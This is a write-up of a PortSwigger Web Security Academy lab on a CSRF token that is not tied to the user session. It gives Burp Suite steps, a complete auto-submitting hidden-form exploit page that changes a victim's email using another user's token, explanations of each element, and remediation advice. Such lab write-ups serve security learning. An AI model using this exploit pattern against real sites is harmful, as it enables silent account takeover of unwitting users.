**Quick Brief:**
- CSRF exploits the browser's automatic credential sending mechanism combined with the application's trust in authenticated requests without verification of user intent
- The vulnerability exists because web applications cannot distinguish between:
      1. A legitimate request initiated by the user through the application's UI
      2. A forged request initiated by an attacker from another site


**What we're testing:** The `/my-account/change-email` endpoint for CSRF protection
**Why it might be vulnerable:** No CSRF token, SameSite cookies, or other anti-CSRF measures
**What CSRF exploits:** Browser automatically sends session cookies with requests


**URL:** https://portswigger.net/web-security/csrf/bypassing-token-validation/lab-token-not-tied-to-user-session
## Steps:
1. Open your lab and log in with given credentials wiener:peter
2. Open Burp Suite we know from the lab describtion the endpoint of the email is vulnerable to csrf
3. Change your email and send the request to repeater
4. Observe from the request there is CSRF token
5. First try to add a number to the token to see if the server actually validates it an error accures
6. Next i tried to delete the whole token and send the request and an error accured
7. Now log in with credentials carlos:montoya after loggin in change the email of carlos and copy it's csrf token value
8. Now replcae wiener csrf token with carlos csrf token and try to send the request notice 302 Found it worked
9. This means the CSRf token is not tied to the user session meaning the server accepts any token from any trusted user it generate
10. Now we will prepare our malicious code

11.
```

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <iframe style="display: none;" id="csrf-iframe"></iframe>
    <form action="https://0ab5000b034fd6cc81dffd5400220068.web-security-academy.net/my-account/change-email" method="post" target="csrf-iframe" id="csrf-form">
        <input type="hidden" name="email" value="test.tes@ca">
        <input type="hidden" name="csrf" value="qkLOysnEbVuSpoT6eFUaMqOSIT0vVY2V">
    </form>
    <script>document.getElementById("csrf-form").submit()</script>
</body>
</html>
```


12. Copy the code and change the lab link to your lab link and paste it in the body of the exploit server and then store the exploit then Deliver exploit to victim
13. Lab solved

## Notes:
- This code is like a normal html page that change the users email automatically without even them knowing by just making the user click on the link
- The  `<form> </form>` is to create a form in html :
`action` here we put our lab link id and the functionality `/my-account/change-email` you want to excute
`method:post` we know from the request

- The `<input>` is to create an input for the email in the html form:
`type:hidden` so the no input field appear to the user
`name:email` we got it from the rquest
`value` is the new email you want to change to

- The `<input>` `name:csrf` is the name of the csrf token 
`value` is the actual token of the carlos
- We need to send the scrf token of carlos on this request so the server validate the token

- The `<iframe></iframe>` is a sand box so the form is excuted inside it :
`style="display: none;` so nothing appear to the user

- `<script>document.getElementById("csrf-form").submit()</script>` here we grap the form by it's id and automatically submits it without the user interaction


## How to Fix (For Developers)
1. **CSRF Tokens**: Generate unique, unpredictable tokens per session and make sure the server expects the present of the token
And make sure the server validate the token linked with the user session 
2. **SameSite Cookies**: `SameSite=Strict` for sensitive actions
3. **Custom Headers**: Require `X-Requested-With: XMLHttpRequest`
4. **Double Submit**: Token in both cookie and request



